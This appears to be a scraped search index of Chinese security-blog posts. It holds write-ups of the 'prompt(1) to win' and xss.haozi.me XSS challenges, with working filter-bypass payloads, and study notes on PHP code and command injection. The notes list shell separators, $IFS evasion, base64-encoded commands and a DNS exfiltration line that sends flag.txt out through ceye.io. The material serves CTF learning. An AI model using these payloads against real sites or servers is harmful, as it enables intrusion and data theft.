","date":"2021-03-31","objectID":"/2021-03-31-prompt1-to-win/:7:0","tags":["Web安全","XSS"],"title":"prompt(1) to win","uri":"/2021-03-31-prompt1-to-win/"},{"categories":["安全技术"],"content":"0x07 function escape(input) {\r// pass in something like dog#cat#bird#mouse...\rvar segments = input.split('#');\rreturn segments.map(function(title) {\r// title can only contain 12 characters\rreturn '\u003cp class=\"comment\" title=\"' + title.slice(0, 12) + '\"\u003e\u003c/p\u003e';\r}).join('\\n');\r} 字符按照#分离，每一部分赋给一个title，如果超过12字符，就截取前12个。可以使用注释绕过长度限制,: \"\u003e\u003cscript\u003e/*#*/prompt(1/*#*/)\u003c/script\u003e\r\"\u003e\u003csvg/a=#\"onload='/*#*/prompt(1)'\r","date":"2021-03-31","objectID":"/2021-03-31-prompt1-to-win/:8:0","tags":["Web安全","XSS"],"title":"prompt(1) to win","uri":"/2021-03-31-prompt1-to-win/"},{"categories":["安全技术"],"content":"0x08 function escape(input) {\r// prevent input from getting out of comment\r// strip off line-breaks and stuff\rinput = input.replace(/[\\r\\n\u003c/\"]/g, '');\rreturn ' \\n\\\r\u003cscript\u003e \\n\\\r// console.log(\"' + input + '\"); \\n\\\r\u003c/script\u003e ';\r} 过滤了两个换行符，所以需要一个特殊的编码技巧： U+2028，是Unicode中的行分隔符。\rU+2029，是Unicode中的段落分隔符。\r--\u003e 在 js 中可当注释使用\r在console中输入：'\\u2028prompt(1)\\u2028--\u003e'或者 '\\u2029prompt(1)\\u2029--\u003e' 输出的结果就是payload。 ","date":"2021-03-31","objectID":"/2021-03-31-prompt1-to-win/:9:0","tags":["Web安全","XSS"],"title":"prompt(1) to win","uri":"/2021-03-31-prompt1-to-win/"},{"categories":["安全技术"],"content":"0x09 function escape(input) {\r// filter potential start-tags\rinput = input.replace(/\u003c([a-zA-Z])/g, '\u003c_$1');\r// use all-caps for heading\rinput = input.toUpperCase();\r// sample input: you shall not pass! =\u003e YOU SHALL NOT PASS!\rreturn '\u003ch1\u003e' + input + '\u003c/h1\u003e';\r} 思路之前在XSS弹窗挑战里说过，给个payload，\u003cſcript/src=\"http://127.0.0.1/1.js\"\u003e ","date":"2021-03-31","objectID":"/2021-03-31-prompt1-to-win/:10:0","tags":["Web安全","XSS"],"title":"prompt(1) to win","uri":"/2021-03-31-prompt1-to-win/"},{"categories":["安全技术"],"content":"0x0A function escape(input) {\r// (╯°□°）╯︵ ┻━┻\rinput = encodeURIComponent(input).replace(/prompt/g, 'alert');\r// ┬──┬ ノ( ゜-゜ノ) chill out bro\rinput = input.replace(/'/g, '');\r// (╯°□°）╯︵ /(.□. \\）DONT FLIP ME BRO\rreturn '\u003cscript\u003e' + input + '\u003c/script\u003e ';\r} encodeURIComponent()不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * ’ ( ) 。其他字符（比如：;/?:@\u0026=+$,# 这些用于分隔 URI 组件的标点符号），都是由一个或多个十六进制的转义序列替换的。且过滤单引号，可以考虑构造p'rompt(1) ","date":"2021-03-31","objectID":"/2021-03-31-prompt1-to-win/:11:0","tags":["Web安全","XSS"],"title":"prompt(1) to win","uri":"/2021-03-31-prompt1-to-win/"},{"categories":["安全技术"],"content":"0x0B function escape(input) {\r// name should not contain special characters\rvar memberName = input.replace(/[[|\\s+*/\\\\\u003c\u003e\u0026^:;=~!%-]/g, '');\r// data to be parsed as JSON\rvar dataString = '{\"action\":\"login\",\"message\":\"Welcome back, ' + memberName + '.\"}';\r// directly \"parse\" data in script context\rreturn ' \\n\\\r\u003cscript\u003e \\n\\\rvar data = ' + dataString + '; \\n\\\rif (data.action === \"login\") \\n\\\rdocument.write(data.message) \\n\\\r\u003c/script\u003e ';\r} 在js中，(prompt(1))instanceof\"1\"和 (prompt(1))in\"1\" 是可以成功弹窗的，其中双引号里面的1可以是任何字符，这里的in或者instanceof是运算符，所以可以有这样的语法结构。 \"(prompt(1))in\"\r\"(prompt(1))instanceof\"\r补充一个知识点，\"1\"(alert(1))虽然会提示语法错误， 但是还是会执行js语句弹框。(和浏览器有关) ","date":"2021-03-31","objectID":"/2021-03-31-prompt1-to-win/:12:0","tags":["Web安全","XSS"],"title":"prompt(1) to win","uri":"/2021-03-31-prompt1-to-win/"},{"categories":["安全技术"],"content":"0x0C function escape(input) {\r// in Soviet Russia...\rinput = encodeURIComponent(input).replace(/'/g, '');\r// table flips you!\rinput = input.replace(/prompt/g, 'alert');\r// ノ┬─┬ノ ︵ ( \\o°o)\\\rreturn '\u003cscript\u003e' + input + '\u003c/script\u003e ';\r} parseInt()可以将字符串转数字，语法parseInt(\u003cem\u003estring\u003c/em\u003e, \u003cem\u003eradix\u003c/em\u003e)。 字段 含义 string 必需。要被解析的字符串。 radix 可选。表示要解析的数字的基数。该值介于 2 ~ 36 之间。 如果省略该参数或其值为 0，则数字将以 10 为基础来解析。如果它以 “0x” 或 “0X” 开头，将以 16 为基数。 如果该参数小于 2 或者大于 36，则 parseInt() 将返回 NaN。 toString()也有一个可选参数radix，找一个足够大的基数来包含所需的所有字符，就可以将字符串编码为一个数字，然后eval转换的结果（数字\u003e字符串）。 可以构造如下payload: eval((1558153217).toString(36))(1) eval((1172936279).toString(34).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41))) 解释:concat连接，String.fromCharCode(40)-\u003e(， String.fromCharCode(41)-\u003e) eval((25).toString(30).concat(String.fromCharCode(114)).concat(String.fromCharCode(111)).concat(String.fromCharCode(109)).concat(String.fromCharCode(112)).concat(String.fromCharCode(116)).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41))) ","date":"2021-03-31","objectID":"/2021-03-31-prompt1-to-win/:13:0","tags":["Web安全","XSS"],"title":"prompt(1) to win","uri":"/2021-03-31-prompt1-to-win/"},{"categories":["安全技术"],"content":"0x0D function escape(input) {\r// extend method from Underscore library\r// _.extend(destination, *sources) function extend(obj) {\rvar source, prop;\rfor (var i = 1, length = arguments.length; i \u003c length; i++) {\rsource = arguments[i];\rfor (prop in source) {\robj[prop] = source[prop];\r}\r}\rreturn obj;\r}\r// a simple picture plugin\rtry {\r// pass in something like {\"source\":\"http://sandbox.prompt.ml/PROMPT.JPG\"}\rvar data = JSON.parse(input);\rvar config = extend({\r// default image source\rsource: 'http://placehold.it/350x150'\r}, JSON.parse(input));\r// forbit invalid image source\rif (/[^\\w:\\/.]/.test(config.source)) {\rdelete config.source;\r}\r// purify the source by stripping off \"\rvar source = config.source.replace(/\"/g, '');\r// insert the content using mustache-ish template\rreturn '\u003cimg src=\"{{source}}\"\u003e'.replace('{{source}}', source);\r} catch (e) {\rreturn 'Invalid image data.';\r}\r} 我太菜了，这题没有思路解，看了下大佬的博客，现在复现下。JSON.parse()函数要接受一个json格式的字符串返回json格式的对象，如果传入的参数已经是json格式则会抛出异常，传入的参数被解析成json格式，格式不对则直接返回Invalid image data.，再经由extend()函数处理，extend()函数把默认值替换为指定的值后返回，然后是一个正则判断source对应的值中是否有不属于url的符号，有则删去这个值，将source属性删除。 每个对象都会在其内部初始化一个属性，就是proto，当我们访问对象的属性时，如果对象内部不存在这个属性，那么就会去proto里面找这个属性。 原理测试test={\"source\":1,\"__proto__\":{\"source\":2}}： 那么基本上就是构造{\"source\":\"'\",\"proto\":{\"source\":\"onerror=prompt(1)\"}},由于前面有非法字符’，则会删除，但是在替换的时候由于过滤了\",无法闭合，那么需要利用replace的一个特性。 '1234567890'.replace('3',\"han\")\r\"12han4567890\"\r'1234567890'.replace('3',\"$\u0026han\")\r\"123han4567890\"\r'1234567890'.replace('3',\"$`han\")\r\"1212han4567890\"\r'1234567890'.replace('3',\"$'han\")\r\"124567890han4567890\"\r'1234567890'.replace('3',\"$$han\")\r\"12$han4567890\"\r最后构造payload{\"source\":\"'\",\" proto\": {\"source\":\"$`onerror=prompt(1)\u003e\"}} ","date":"2021-03-31","objectID":"/2021-03-31-prompt1-to-win/:14:0","tags":["Web安全","XSS"],"title":"prompt(1) to win","uri":"/2021-03-31-prompt1-to-win/"},{"categories":["安全技术"],"content":"0x0E function escape(input) {\r// I expect this one will have other solutions, so be creative :)\r// mspaint makes all file names in all-caps :(\r// too lazy to convert them back in lower case\r// sample input: prompt.jpg =\u003e PROMPT.JPG\rinput = input.toUpperCase();\r// only allows images loaded from own host or data URI scheme\rinput = input.replace(/\\/\\/|\\w+:/g, 'data:');\r// miscellaneous filtering\rinput = input.replace(/[\\\\\u0026+%\\s]|vbs/gi, '_');\rreturn '\u003cimg src=\"' + input + '\"\u003e';\r} 函数先把输入转换为大写，第二层将//和字母换为data:，第三层将\\、\u0026、+、%和空白字符，vbs替换为_，所以不能内嵌编码后的字符，由于js大小写敏感，所以只能引用外部脚本。 Data URI是由RFC 2397定义的一种把小文件直接嵌入文档的方案。格式如下： data:[\u003cMIME type\u003e][;charset=\u003ccharset\u003e][;base64],\u003cencoded data\u003e\r其实整体可以视为三部分，即声明：参数+数据，逗号左边的是各种参数，右边的是数据。 MIME type，表示数据呈现的格式，即指定嵌入数据的MIME。 1、对于PNG的图片，其格式是image/png，如果没有指定，默认是text/plain。 2、character set(字符集）大多数被忽略，默认是charset=US-ASCII。如果指定是的数据格式是图片时，字符集将不再使用。 3、base64，这一部分将表明其数据的编码方式，此处为声明后面的数据的编码是base64，我们可以不必使用base64编码格式，如果那样，我们将使用标准的URL编码方式,形如%XX%XX%XX的格式。 一个data URI范例： \u003ca href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=\"\u003etest\u003ca\u003e\r这道题目有问题，并不能复现成功，参考payload：\"\u003e\u003cIFRAME/SRC=\"x:text/html;base64,ICA8U0NSSVBUIC8KU1JDCSA9SFRUUFM6UE1UMS5NTD4JPC9TQ1JJUFQJPD4= ","date":"2021-03-31","objectID":"/2021-03-31-prompt1-to-win/:15:0","tags":["Web安全","XSS"],"title":"prompt(1) to win","uri":"/2021-03-31-prompt1-to-win/"},{"categories":["安全技术"],"content":"0x0F function escape(input) { // sort of spoiler of level 7 input = input.replace(/\\*/g, ''); // pass in something like dog#cat#bird#mouse... var segments = input.split('#'); return segments.map(function(title, index) { // title can only contain 15 characters return '\u003cp class=\"comment\" title=\"' + title.slice(0, 15) + '\" data-comment=\\'{\"id\":' + index + '}\\'\u003e\u003c/p\u003e'; }).join('\\n'); } 7的加强版，会过滤掉*。可以用\u003csvg\u003e标签构造关于\u003c!-—\u003e的注释。 \"\u003e\u003csvg\u003e\u003c!--#--\u003e\u003cscript\u003e\u003c!--#--\u003eprompt(1\u003c!--#--\u003e)\u003c/script\u003e\r\"\u003e\u003csvg\u003e\u003c!--#--\u003e\u003cscript\u003e\u003c!--#--\u003eprompt(1)\u003c/\r模板字符串 知识点： 1.反撇号字符 ` 代替普通字符串的引号 ’ 或 “，提供了字符串插值功能。 2.${x}被称为模板占位符，JavaScript 将把 x 的值插入到最终生成的字符串中，也就是说`abcd${alert(1)}efgh`是可以正常执行的。 \"\u003e\u003cscript\u003e`#${prompt(1)}#`\u003c/script\u003e\r","date":"2021-03-31","objectID":"/2021-03-31-prompt1-to-win/:16:0","tags":["Web安全","XSS"],"title":"prompt(1) to win","uri":"/2021-03-31-prompt1-to-win/"},{"categories":["安全技术"],"content":"\r练练手，https://xss.haozi.me/#/ ","date":"2021-03-27","objectID":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/:0:0","tags":["Web安全","XSS"],"title":"XSS弹窗挑战","uri":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/"},{"categories":["安全技术"],"content":"0x00 输入\u003cscript\u003ealert(1);\u003c/script\u003e ","date":"2021-03-27","objectID":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/:1:0","tags":["Web安全","XSS"],"title":"XSS弹窗挑战","uri":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/"},{"categories":["安全技术"],"content":"0x01 Server code function render (input) {\rreturn '\u003ctextarea\u003e' + input + '\u003c/textarea\u003e'\r}\r这次可以闭合一下，\u003c/textarea\u003e\u003cscript\u003ealert(1);\u003c/script\u003e ","date":"2021-03-27","objectID":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/:2:0","tags":["Web安全","XSS"],"title":"XSS弹窗挑战","uri":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/"},{"categories":["安全技术"],"content":"0x02 Server code function render (input) {\rreturn '\u003cinput type=\"name\" value=\"' + input + '\"\u003e'\r}\r闭合单引号 ，'\"\u003e\u003cscript\u003ealert(1);\u003c/script\u003e ","date":"2021-03-27","objectID":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/:3:0","tags":["Web安全","XSS"],"title":"XSS弹窗挑战","uri":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/"},{"categories":["安全技术"],"content":"0x03 Server code function render (input) {\rconst stripBracketsRe = /[()]/g\rinput = input.replace(stripBracketsRe, '')\rreturn input\r}\rjs的正则表达式的语法/正则表达式主体/修饰符(可选) 修饰符可以在全局搜索中不区分大小写: 修饰符 描述 i 执行对大小写不敏感的匹配。 g 执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。 m 执行多行匹配。 方括号[]用于查找某个范围内的字符，所以是过滤了圆括号，这里用`代替。\u003cscript\u003ealert`1`;\u003c/script\u003e ","date":"2021-03-27","objectID":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/:4:0","tags":["Web安全","XSS"],"title":"XSS弹窗挑战","uri":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/"},{"categories":["安全技术"],"content":"0x04 Server code function render (input) {\rconst stripBracketsRe = /[()`]/g\rinput = input.replace(stripBracketsRe, '')\rreturn input\r}\r这次通过执行实体字符来实现。参考https://www.w3school.com.cn/charsets/ref_html_8859.asp \u003csvg\u003e\u003cscript\u003ealert\u0026#40;1\u0026#41;;\u003c/script\u003e ","date":"2021-03-27","objectID":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/:5:0","tags":["Web安全","XSS"],"title":"XSS弹窗挑战","uri":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/"},{"categories":["安全技术"],"content":"0x05 Server code function render (input) {\rinput = input.replace(/--\u003e/g, '😂')\rreturn '\u003c!-- ' + input + ' --\u003e'\r}\r注释方式有两种: \u003c!-- 注释内容 --\u003e \u003c!-- 注释内容 --!\u003e 输入--!\u003e\u003cscript\u003ealert(1);\u003c/script\u003e ","date":"2021-03-27","objectID":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/:6:0","tags":["Web安全","XSS"],"title":"XSS弹窗挑战","uri":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/"},{"categories":["安全技术"],"content":"0x06 Server code function render (input) {\rinput = input.replace(/auto|on.*=|\u003e/ig, '_')\rreturn `\u003cinput value=1 ${input} type=\"text\"\u003e`\r}\r过滤以auto开头、on开头=结尾的字符串、\u003c并替换成_。但并没有匹配换行符, 可以通过换行来绕过匹配。 type=\"image\" src=# onerror\r=alert(1)\r","date":"2021-03-27","objectID":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/:7:0","tags":["Web安全","XSS"],"title":"XSS弹窗挑战","uri":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/"},{"categories":["安全技术"],"content":"0x07 Server code function render (input) {\rconst stripTagsRe = /\u003c\\/?[^\u003e]+\u003e/gi\rinput = input.replace(stripTagsRe, '')\rreturn `\u003carticle\u003e${input}\u003c/article\u003e`\r}\r\u003c/?[^\u003e]+\u003e，第一段匹配**\u003c** 或者 \u003c/，第二段匹配除了\u003e的任意字符的一次或者多次，第三段匹配\u003e，连起来就是匹配:\u003c/ 任意字符 \u003e。可以利用html的单标签解析。 ","date":"2021-03-27","objectID":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/:8:0","tags":["Web安全","XSS"],"title":"XSS弹窗挑战","uri":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/"},{"categories":["安全技术"],"content":"0x08 Server code function render (src) {\rsrc = src.replace(/\u003c\\/style\u003e/ig, '/* \\u574F\\u4EBA */')\rreturn `\r\u003cstyle\u003e\r${src}\r\u003c/style\u003e\r`\r}\r通过\u003c/style \u003e来闭合。 ","date":"2021-03-27","objectID":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/:9:0","tags":["Web安全","XSS"],"title":"XSS弹窗挑战","uri":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/"},{"categories":["安全技术"],"content":"0x09 Server code function render (input) {\rlet domainRe = /^https?:\\/\\/www\\.segmentfault\\.com/\rif (domainRe.test(input)) {\rreturn `\u003cscript src=\"${input}\"\u003e\u003c/script\u003e`\r}\rreturn 'Invalid URL'\r}\r可以通过在com后面闭合双引号, 再构造onerror事件，后面加注释绕过。https://www.segmentfault.com\" onerror=alert(1)// ","date":"2021-03-27","objectID":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/:10:0","tags":["Web安全","XSS"],"title":"XSS弹窗挑战","uri":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/"},{"categories":["安全技术"],"content":"0x0A Server code function render (input) {\rfunction escapeHtml(s) {\rreturn s.replace(/\u0026/g, '\u0026')\r.replace(/'/g, ''')\r.replace(/\"/g, '\"')\r.replace(/\u003c/g, '\u003c')\r.replace(/\u003e/g, '\u003e')\r.replace(/\\//g, '/')\r}\rconst domainRe = /^https?:\\/\\/www\\.segmentfault\\.com/\rif (domainRe.test(input)) {\rreturn `\u003cscript src=\"${escapeHtml(input)}\"\u003e\u003c/script\u003e`\r}\rreturn 'Invalid URL'\r}\r用url的@语法来进行跳转调用，https://www.segmentfault.com@xss.haozi.me/j.js ","date":"2021-03-27","objectID":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/:11:0","tags":["Web安全","XSS"],"title":"XSS弹窗挑战","uri":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/"},{"categories":["安全技术"],"content":"0x0B Server code function render (input) {\rinput = input.toUpperCase()\rreturn `\u003ch1\u003e${input}\u003c/h1\u003e`\r}\rHTML对大小写是不敏感的，而JavaScript对大小写敏感。 \u003cimg src=# onerror=\"\u0026#97;\u0026#108;\u0026#101;\u0026#114;\u0026#116;\u0026#40;\u0026#49;\u0026#41;\"\u003e 另一种思路是: 域名对大小写也不敏感 ","date":"2021-03-27","objectID":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/:12:0","tags":["Web安全","XSS"],"title":"XSS弹窗挑战","uri":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/"},{"categories":["安全技术"],"content":"0x0C Server code function render (input) {\rinput = input.replace(/script/ig, '')\rinput = input.toUpperCase()\rreturn '\u003ch1\u003e' + input + '\u003c/h1\u003e'\r}\r上题的payload可以解决。 ","date":"2021-03-27","objectID":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/:13:0","tags":["Web安全","XSS"],"title":"XSS弹窗挑战","uri":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/"},{"categories":["安全技术"],"content":"0x0D Server code function render (input) {\rinput = input.replace(/[\u003c/\"']/g, '')\rreturn `\r\u003cscript\u003e\r// alert('${input}')\r\u003c/script\u003e\r`\r}\ralert(1); --\u003e ","date":"2021-03-27","objectID":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/:14:0","tags":["Web安全","XSS"],"title":"XSS弹窗挑战","uri":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/"},{"categories":["安全技术"],"content":"0x0E Server code function render (input) {\rinput = input.replace(/\u003c([a-zA-Z])/g, '\u003c_$1')\rinput = input.toUpperCase()\rreturn '\u003ch1\u003e' + input + '\u003c/h1\u003e'\r}\r将尖括号后面追加一个下划线, 并且将所有字符大写,匹配了所有\u003c与字母的组合。 这题很离谱，答案更离谱，逆向思维，还真有字符的大写是S的: ſ ， https://www.thetype.com/2009/10/1577/ 依照这种思路，找到土耳其语中**ı**的大写是i，payload如下： \u003cımg src=# onerror=\"\u0026#97;\u0026#108;\u0026#101;\u0026#114;\u0026#116;\u0026#40;\u0026#49;\u0026#41;\"\u003e ","date":"2021-03-27","objectID":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/:15:0","tags":["Web安全","XSS"],"title":"XSS弹窗挑战","uri":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/"},{"categories":["安全技术"],"content":"0x0F Server code function render (input) {\rfunction escapeHtml(s) {\rreturn s.replace(/\u0026/g, '\u0026')\r.replace(/'/g, ''')\r.replace(/\"/g, '\"')\r.replace(/\u003c/g, '\u003c')\r.replace(/\u003e/g, '\u003e')\r.replace(/\\//g, '/')\r}\rreturn `\u003cimg src onerror=\"console.error('${escapeHtml(input)}')\"\u003e`\r}\r编码后html标签解析代码时, 被过滤编码的字符仍然会被还原来执行,等于是过滤了个寂寞。'); alert(1); // ","date":"2021-03-27","objectID":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/:16:0","tags":["Web安全","XSS"],"title":"XSS弹窗挑战","uri":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/"},{"categories":["安全技术"],"content":"0x10 Server code function render (input) {\rreturn `\r\u003cscript\u003e\rwindow.data = ${input}\r\u003c/script\u003e\r`\r}\r'';alert(1) ","date":"2021-03-27","objectID":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/:17:0","tags":["Web安全","XSS"],"title":"XSS弹窗挑战","uri":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/"},{"categories":["安全技术"],"content":"0x11 Server code // from alf.nu\rfunction render (s) {\rfunction escapeJs (s) {\rreturn String(s)\r.replace(/\\\\/g, '\\\\\\\\')\r.replace(/'/g, '\\\\\\'')\r.replace(/\"/g, '\\\\\"')\r.replace(/`/g, '\\\\`')\r.replace(/\u003c/g, '\\\\74')\r.replace(/\u003e/g, '\\\\76')\r.replace(/\\//g, '\\\\/')\r.replace(/\\n/g, '\\\\n')\r.replace(/\\r/g, '\\\\r')\r.replace(/\\t/g, '\\\\t')\r.replace(/\\f/g, '\\\\f')\r.replace(/\\v/g, '\\\\v')\r// .replace(/\\b/g, '\\\\b')\r.replace(/\\0/g, '\\\\0')\r}\rs = escapeJs(s)\rreturn `\r\u003cscript\u003e\rvar url = 'javascript:console.log(\"${s}\")'\rvar a = document.createElement('a')\ra.href = url\rdocument.body.appendChild(a)\ra.click()\r\u003c/script\u003e\r`\r}\r//虽然被转义成了//, 但转义之后还是//, 在js中还是注释符。构造\");alert(1)//。 ","date":"2021-03-27","objectID":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/:18:0","tags":["Web安全","XSS"],"title":"XSS弹窗挑战","uri":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/"},{"categories":["安全技术"],"content":"0x12 Server code // from alf.nu\rfunction escape (s) {\rs = s.replace(/\"/g, '\\\\\"')\rreturn '\u003cscript\u003econsole.log(\"' + s + '\");\u003c/script\u003e'\r}\r构造\\\");alert(1)// ","date":"2021-03-27","objectID":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/:19:0","tags":["Web安全","XSS"],"title":"XSS弹窗挑战","uri":"/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/"},{"categories":["学习","安全技术"],"content":"\r","date":"2021-03-23","objectID":"/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:0","tags":["Web安全","CTF"],"title":"安全牛代码/命令执行学习笔记","uri":"/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x00 代码执行相关函数 菜刀不支持php7。 eval(string code_str)把字符串作为PHP代码执行，Code_str是PHP代码字符串。 assert ($assertion [, string $description ] ) 检查一个断言是否为FALSE，assertion是字符串，它将会被当做PHP代码来执行。 call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )callback是将被调用的回调函数，parameter是0个或以上的参数，被传入回调函数。可以传递任何内置的或者用户自定义的函数，除了语言结构如array()，echo()，empty()，eval()，exit()，isset()，list()，print() 和 unset()。 call_user_func_array ( callable $callback , array $param_arr )callback被调用的回调函数，param_arr要被传入回调函数的数组。 create_function ( string $args , string $code )创建一个匿名（lambda 风格）函数，args是要创建的函数的参数，code是函数内的代码。 preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int \u0026$count ]] )执行一个正则表达式的搜索和替换。/e 修正符使 preg_replace将 replacement 参数当做 PHP 代码【在适当的逆向引用和替换完之后】只有匹配上了才会执行。 array_map ( callable $callback , array $array1 [, array $... ] )为数组的每个元素应用回调函数 范例：url?a=assert\u0026b=phpinfo() 如果注释掉$array[0]=$b，修改$array=$b，范例应为url?a=assert\u0026b[]=phpinfo() usort ( array \u0026$array , callable $value_compare_func )使用用户自定义的比较函数对数组中的值进行排序。 注释的范例：url?1[]=phpinfo()\u00261[]=，需要转两个参数比较，执行的命令必须放在第一位。 uasort ( array \u0026$array , callable $value_compare_func )使用用户自定义的比较函数对数组中的值进行排序并保持索引关联。 范例：url?pass=phpinfo() ${php代码} ","date":"2021-03-23","objectID":"/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:0","tags":["Web安全","CTF"],"title":"安全牛代码/命令执行学习笔记","uri":"/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x01 命令执行相关函数及各类命令执行绕过技巧 system(string command, int \u0026return_var)可以用来执行系统命令并将相应的执行结果输出。 exec (string command, array \u0026output, int \u0026return_var)command是要执行的命令，output是获得执行命令输出的每一行字符串，return_var存放执行命令后的状态值。 命令执行结果的最后一行内容。 如果你需要获取未经处理的全部输出数据， 请使用 passthru() 函数。 如果想要获取命令的输出内容， 请确保使用 output 参数。 passthru (string command, int \u0026return_var)command是要执行的命令，return_var存放执行命令后的状态值。 shell_exec (string command)command是要执行的命令。 ``运算符，与shell_exec功能相同，执行shell命令并返回输出的字符串。 ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )打开输出控制缓冲。范例：url?a=ls，注意php7中无效。 命令执行的分隔符： 换行符 %0a\r回车符 %0d\r连续指令 ;\r后台进程 \u0026\r管道符 |\r(逻辑?) || \u0026\u0026\r命令执行的空格代替： \u003c符号\r$IFS\r${IFS}\r$IFS$9\r%09用于url传递\r命令执行的绕过： a=l;b=s;$a$b\r`echo d2hvYW1p|base64 -d`base64编码\r“substr string pos len\"用法示例。该表达式是从string中取出从pos位置开始长度为len的子字符串。如果pos或len为非正整数时，将返回空字符串。一些用法范例： echo \"${PATH:0:1}\"\recho \"`expr$IFS\\substr\\$IFS\\$(pwd)\\$IFS\\1\\$IFS\\1`\"\recho `$(expr${IFS}substr${IFS}$PWD${IFS}1${IFS}1)`\rexpr${IFS}substr${IFS}$SESSION_MANAGER${IFS}6${IFS}1\r$(pwd)与pwd的区别在于更明确，$PWD是环境变量。 ","date":"2021-03-23","objectID":"/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:0","tags":["Web安全","CTF"],"title":"安全牛代码/命令执行学习笔记","uri":"/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x02 命令执行无回显的判断方法 命令无回显时的判断：延时（sleep time）、HTTP请求（curl ip:port+自己的服务器nc -lv port）、DNS请求（curl或ping域名+ceye等平台）。 利用：写shell（直接写入/外部下载）、http/dns等方式带出数据。 范例1：ping=`cat flag.txt|sed /[[:space:]]//`.xxx.ceye.io 